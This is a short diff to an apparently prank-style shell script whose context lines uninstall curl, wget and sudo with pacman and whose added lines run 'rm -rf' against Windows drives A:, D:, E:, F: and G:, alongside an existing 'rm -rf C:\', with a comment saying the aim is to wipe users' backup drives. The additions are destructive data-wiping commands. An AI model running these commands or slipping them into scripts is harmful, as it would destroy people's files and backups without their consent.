@@ -41,8 +41,14 @@ pacman -Rns curl
 sudo pacman -Rns wget
 sudo pacman -Rns sudo
 # windows version #
-echo 'if windows somehow -bc theres sh ports'
+echo 'if windows somehow ported sh bc theres sh ports'
 rm -rf C:\
+#a rm -rf dditional drives incase user has backup drives for windows #
+rm -rf A:\
+rm -rf  D:\
+rm -rf E:\
+Rm -rf F:\
+rm -rf G:\
 # end of windows version #
 mkdir /done/
 mkdir /status/
